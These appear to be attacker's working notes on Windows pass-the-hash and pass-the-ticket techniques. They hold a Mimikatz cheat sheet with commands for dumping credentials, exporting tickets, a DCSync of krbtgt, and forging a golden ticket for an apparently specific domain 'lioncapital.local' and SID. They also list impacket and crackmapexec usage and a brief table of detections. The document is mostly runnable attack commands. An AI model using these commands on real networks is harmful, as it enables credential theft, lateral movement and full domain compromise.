# Pass-the-Hash / Pass-the-Ticket Notes

## PTH Workflow

1. Get NTLM hash from any of:
   - LSASS dump (need SYSTEM)
   - SAM hive (reg save HKLM\SAM + HKLM\SYSTEM)
   - LSA secrets (Mimikatz lsadump::secrets)
   - sekurlsa::logonpasswords

2. Use hash to authenticate WITHOUT plaintext password

3. Tools:
   - Mimikatz sekurlsa::pth
   - impacket-psexec.py -hashes :HASH
   - impacket-wmiexec.py -hashes :HASH
   - crackmapexec -H HASH (or NetExec)

## PTT Workflow

1. Get Kerberos ticket:
   - sekurlsa::tickets /export
   - kerberos::list /export

2. Inject ticket:
   - kerberos::ptt ticket.kirbi

3. Authenticate as that user to that service without NTLM

## Detection Reality

| Detection | Catches |
|-----------|---------|
| Sysmon EID 1 | Overuse of psexec, wmic remote process create |
| Defender ATP | "Lateral movement" alerts |
| MDI | Lateral path detection |
| SIEM | Failed logons to multiple machines |
| Credential Guard | Blocks hashes from LSASS (if enabled) |

## Mimikatz Cheat Sheet

```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
sekurlsa::pth /user:Admin /domain:lioncapital.local /ntlm:HASH /run:cmd.exe
kerberos::ptt ticket.kirbi
lsadump::dcsync /user:lioncapital\krbtgt
kerberos::golden /user:Administrator /domain:lioncapital.local /sid:S-1-5-21-1192132689-1058670598-4104447906 /krbtgt:HASH /ptt
```
